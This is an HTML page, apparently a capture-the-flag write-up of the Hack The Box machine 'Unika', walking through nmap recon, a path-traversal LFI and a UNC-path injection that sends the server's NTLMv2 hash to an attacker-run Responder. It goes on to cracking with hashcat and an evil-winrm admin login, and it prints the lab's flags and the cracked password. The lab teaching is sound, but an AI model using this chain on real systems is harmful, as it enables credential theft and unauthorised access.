@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="../assets/components.js"></script>
+  <style>
+    .wr-hero { margin-bottom:36px; }
+    .wr-title { font-family:var(--mono); font-size:36px; font-weight:700; color:var(--text); margin-bottom:10px; }
+    .wr-title em { color:var(--green); font-style:normal; }
+    .wr-meta { display:flex; gap:7px; flex-wrap:wrap; margin-bottom:18px; }
+    .wr-summary { font-size:15px; color:var(--muted); line-height:1.8; max-width:700px; border-left:2px solid var(--green); padding-left:16px; }
+
+    .flags { display:flex; gap:12px; margin:22px 0; flex-wrap:wrap; }
+    .flag-box { background:var(--bg3); border:1px solid var(--border); border-radius:8px; padding:14px 18px; flex:1; min-width:200px; }
+    .flag-lbl { font-family:var(--mono); font-size:10px; color:var(--muted); text-transform:uppercase; letter-spacing:.1em; margin-bottom:6px; }
+    .flag-val { font-family:var(--mono); font-size:13px; color:var(--green); word-break:break-all; }
+
+    .wr-section { margin-bottom:44px; scroll-margin-top:70px; }
+    .wr-sec-hdr { display:flex; align-items:center; gap:12px; margin-bottom:20px; padding-bottom:10px; border-bottom:1px solid var(--border); }
+    .step-num { font-family:var(--mono); font-size:11px; color:var(--green); background:var(--gglow); border:1px solid rgba(57,211,83,.25); padding:2px 10px; border-radius:4px; }
+    .step-title { font-family:var(--mono); font-size:18px; font-weight:500; color:var(--text); }
+
+    .prose { font-size:15px; line-height:1.85; color:#a0aab4; margin-bottom:14px; }
+    .prose strong { color:var(--text); font-weight:500; }
+    .prose code { font-family:var(--mono); font-size:12px; background:var(--surface2); color:var(--orange); padding:2px 6px; border-radius:3px; }
+
+    /* TOC extra sidebar */
+    .toc-extra { padding:14px 10px 10px; border-top:1px solid var(--border); }
+    .toc-lbl { font-family:var(--mono); font-size:10px; color:var(--muted); letter-spacing:.12em; text-transform:uppercase; padding:0 8px; margin-bottom:6px; }
+    .toc-item { display:flex; align-items:center; gap:8px; padding:6px 10px; border-radius:5px; font-family:var(--mono); font-size:11px; color:var(--muted); text-decoration:none; transition:all .15s; border:1px solid transparent; }
+    .toc-item:hover { background:var(--surface); color:var(--text); }
+    .toc-item.active { color:var(--green); background:var(--gglow); border-color:rgba(57,211,83,.2); }
+    .toc-num { color:var(--gdim); font-size:10px; width:14px; flex-shrink:0; }
+    .mc-info { margin:10px; background:var(--bg3); border:1px solid var(--border); border-radius:8px; overflow:hidden; }
+    .mc-info-row { display:flex; justify-content:space-between; font-family:var(--mono); font-size:11px; padding:7px 14px; border-bottom:1px solid var(--border); }
+    .mc-info-row:last-child { border-bottom:none; }
+    .mc-info-k { color:var(--muted); }
+    .mc-info-v { color:var(--text); }
+  </style>
+</head>
+<body>
+<div class="page-content">
+
+  <!-- HERO -->
+  <div class="wr-hero">
+    <div class="wr-title">Unika<em>.</em></div>
+    <div class="wr-meta">
+      <span class="tag tag-green">Easy</span>
+      <span class="tag tag-orange">Windows</span>
+      <span class="tag tag-orange">LFI</span>
+      <span class="tag tag-red">NTLMv2</span>
+      <span class="tag tag-purple">Hashcat</span>
+      <span class="tag tag-muted">HTB Starting Point</span>
+    </div>
+    <div class="wr-summary">
+      Beginner-friendly Windows machine teaching LFI via path traversal,
+      UNC path injection to capture NTLMv2 hashes through Responder,
+      and cracking with Hashcat to gain administrator access.
+    </div>
+  </div>
+
+  <div class="flags">
+    <div class="flag-box"><div class="flag-lbl">User Flag</div><div class="flag-val">ea81b7afddd03efaa0945333ed147fac</div></div>
+    <div class="flag-box"><div class="flag-lbl">Root Flag</div><div class="flag-val">f408fc0d9a43f0fc17b2bfdb10f3c3f8</div></div>
+  </div>
+
+  <!-- STEP 1 -->
+  <div class="wr-section" id="recon">
+    <div class="wr-sec-hdr"><span class="step-num">01</span><span class="step-title">Reconnaissance</span></div>
+    <p class="prose">Start with a full Nmap scan to identify open ports and running services.</p>
+    <div class="terminal">
+      <div class="term-bar"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div><span class="term-label">nmap</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">
+<span class="tp">$</span> <span class="tc">nmap</span> <span class="tf">-sC -sV -oN</span> <span class="ta">unika.txt</span> <span class="tt">10.129.95.234</span>
+
+<span class="to">PORT   STATE SERVICE VERSION</span>
+<span class="thl"><span class="to">80/tcp open  http    Apache httpd 2.4.52 ((Win64) PHP/8.1.1)</span></span>
+<span class="to">|_http-title: Unika</span>
+      </div>
+    </div>
+    <div class="callout c-find"><strong>finding:</strong> port 80 open — Apache with PHP on Windows. Single exposed service, focus on web.</div>
+  </div>
+
+  <!-- STEP 2 -->
+  <div class="wr-section" id="enum">
+    <div class="wr-sec-hdr"><span class="step-num">02</span><span class="step-title">Web Enumeration</span></div>
+    <p class="prose">Add the host to <code>/etc/hosts</code>, then browse the site. The URL reveals a <code>page</code> GET parameter that loads language files — classic LFI setup.</p>
+    <div class="terminal">
+      <div class="term-bar"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div><span class="term-label">hosts + observation</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">
+<span class="tp">$</span> <span class="tc">echo</span> <span class="ta">"10.129.95.234 unika.htb"</span> | <span class="tc">sudo tee -a</span> /etc/hosts
+
+<span class="tcm"># URL observed while browsing:</span>
+<span class="thl"><span class="to">http://unika.htb/index.php?page=german.php</span></span>
+<span class="tcm"># => 'page' param loads files — potential LFI</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- STEP 3 -->
+  <div class="wr-section" id="lfi">
+    <div class="wr-sec-hdr"><span class="step-num">03</span><span class="step-title">LFI — Path Traversal</span></div>
+    <p class="prose">Test the <code>page</code> parameter with path traversal. On Windows we target the hosts file to confirm the vulnerability, then weaponize with a UNC path.</p>
+    <div class="terminal">
+      <div class="term-bar"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div><span class="term-label">LFI confirm</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">
+<span class="tcm"># confirm LFI — read Windows hosts file</span>
+<span class="thl"><span class="tt">http://unika.htb/index.php?page=../../../../windows/system32/drivers/etc/hosts</span></span>
+
+<span class="to">127.0.0.1 localhost  ← file content returned, LFI confirmed!</span>
+
+<span class="tcm"># now trigger UNC path to capture NTLMv2 hash</span>
+<span class="thl"><span class="tt">http://unika.htb/index.php?page=\\10.10.14.22\share\x</span></span>
+      </div>
+    </div>
+    <div class="callout c-warn"><strong>why UNC?</strong> Windows authenticates automatically when resolving <code>\\IP\share</code> paths — it sends NTLMv2 credentials. Responder intercepts this.</div>
+  </div>
+
+  <!-- STEP 4 -->
+  <div class="wr-section" id="capture">
+    <div class="wr-sec-hdr"><span class="step-num">04</span><span class="step-title">NTLMv2 Capture</span></div>
+    <p class="prose">Start Responder on <code>tun0</code> before triggering the UNC request. It will intercept the authentication and save the hash.</p>
+    <div class="terminal">
+      <div class="term-bar"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div><span class="term-label">responder</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">
+<span class="tcm"># terminal 1 — listener</span>
+<span class="tp">$</span> <span class="tc">sudo responder</span> <span class="tf">-I</span> <span class="ta">tun0</span>
+
+<span class="tcm"># terminal 2 — trigger via curl</span>
+<span class="tp">$</span> <span class="tc">curl</span> <span class="tt">"http://unika.htb/index.php?page=\\\\10.10.14.22\\share\\x"</span>
+
+<span class="tcm"># responder output:</span>
+<span class="thl"><span class="to">[SMB] NTLMv2 Hash     : administrator::UNIKA:4e6d35...(truncated)</span></span>
+<span class="to">Saved to: /usr/share/responder/logs/SMB-NTLMv2-SSP-10.129.95.234.txt</span>
+      </div>
+    </div>
+    <div class="callout c-find"><strong>captured:</strong> NTLMv2 hash for <strong>administrator</strong>. Copy the full hash line to a file.</div>
+  </div>
+
+  <!-- STEP 5 -->
+  <div class="wr-section" id="crack">
+    <div class="wr-sec-hdr"><span class="step-num">05</span><span class="step-title">Hash Cracking</span></div>
+    <p class="prose">NTLMv2 = mode <strong>5600</strong> in Hashcat. Rockyou cracks this instantly.</p>
+    <div class="terminal">
+      <div class="term-bar"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div><span class="term-label">hashcat -m 5600</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">
+<span class="tp">$</span> <span class="tc">hashcat</span> <span class="tf">-m 5600</span> <span class="ta">hash.txt</span> <span class="ta">/usr/share/wordlists/rockyou.txt</span>
+
+<span class="to">Status: Cracked</span>
+<span class="thl"><span class="to">ADMINISTRATOR::UNIKA:... : badminton</span></span>
+      </div>
+    </div>
+    <div class="callout c-find"><strong>creds:</strong> <code>administrator : badminton</code></div>
+  </div>
+
+  <!-- STEP 6 -->
+  <div class="wr-section" id="access">
+    <div class="wr-sec-hdr"><span class="step-num">06</span><span class="step-title">Access &amp; Flags</span></div>
+    <p class="prose">Log in with Evil-WinRM. We land directly as Administrator.</p>
+    <div class="terminal">
+      <div class="term-bar"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div><span class="term-label">evil-winrm</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">
+<span class="tp">$</span> <span class="tc">evil-winrm</span> <span class="tf">-i</span> <span class="tt">10.129.95.234</span> <span class="tf">-u</span> <span class="ta">administrator</span> <span class="tf">-p</span> <span class="ta">badminton</span>
+
+<span class="thl"><span class="to">*Evil-WinRM* PS C:\Users\Administrator&gt;</span></span>
+
+<span class="tp">*EWR*</span> <span class="tc">type</span> <span class="tt">C:\Users\mike\Desktop\flag.txt</span>
+<span class="thl"><span class="to">ea81b7afddd03efaa0945333ed147fac</span></span>
+
+<span class="tp">*EWR*</span> <span class="tc">type</span> <span class="tt">C:\Users\Administrator\Desktop\flag.txt</span>
+<span class="thl"><span class="to">f408fc0d9a43f0fc17b2bfdb10f3c3f8</span></span>
+      </div>
+    </div>
+    <div class="callout c-info"><strong>chain:</strong> nmap → LFI discovery → UNC path → Responder → hashcat → evil-winrm admin shell</div>
+  </div>
+
+  <!-- nav -->
+  <div style="display:flex;justify-content:space-between;margin-top:24px;font-family:var(--mono);font-size:12px;">
+    <a href="index.html" style="color:var(--muted);text-decoration:none;">← all writeups</a>
+    <a href="thetoppers.html" style="color:var(--green);text-decoration:none;">TheToppers →</a>
+  </div>
+
+</div><!-- /page-content -->
+<script>
+  initPage({
+    title: 'Unika — Writeup',
+    breadcrumb: 'writeups/unika',
+    tags: [
+      { label: 'Easy',    color: 'green'  },
+      { label: 'Windows', color: 'orange' },
+      { label: 'LFI',     color: 'red'    },
+    ],
+    extraSb: `
+      <div class="mc-info">
+        <div class="mc-info-row"><span class="mc-info-k">machine</span><span class="mc-info-v">Unika</span></div>
+        <div class="mc-info-row"><span class="mc-info-k">os</span><span class="mc-info-v">Windows</span></div>
+        <div class="mc-info-row"><span class="mc-info-k">difficulty</span><span class="mc-info-v" style="color:var(--green)">Easy</span></div>
+        <div class="mc-info-row"><span class="mc-info-k">ip</span><span class="mc-info-v">10.129.95.234</span></div>
+        <div class="mc-info-row"><span class="mc-info-k">user</span><span class="mc-info-v" style="color:var(--green)">✓</span></div>
+        <div class="mc-info-row"><span class="mc-info-k">root</span><span class="mc-info-v" style="color:var(--green)">✓</span></div>
+      </div>
+      <div class="toc-extra">
+        <div class="toc-lbl">contents</div>
+        <a href="#recon"   class="toc-item active"><span class="toc-num">01</span>Recon</a>
+        <a href="#enum"    class="toc-item"><span class="toc-num">02</span>Enumeration</a>
+        <a href="#lfi"     class="toc-item"><span class="toc-num">03</span>LFI</a>
+        <a href="#capture" class="toc-item"><span class="toc-num">04</span>NTLMv2 Capture</a>
+        <a href="#crack"   class="toc-item"><span class="toc-num">05</span>Hash Cracking</a>
+        <a href="#access"  class="toc-item"><span class="toc-num">06</span>Access &amp; Flags</a>
+      </div>`,
+  });
+
+  // TOC scroll tracking
+  const tocLinks = document.querySelectorAll('.toc-item');
+  const sections = document.querySelectorAll('.wr-section');
+  window.addEventListener('scroll', () => {
+    let cur = '';
+    sections.forEach(s => { if (window.scrollY >= s.offsetTop - 100) cur = s.id; });
+    tocLinks.forEach(l => l.classList.toggle('active', l.getAttribute('href') === '#' + cur));
+  });
+</script>
+</body>
+</html>
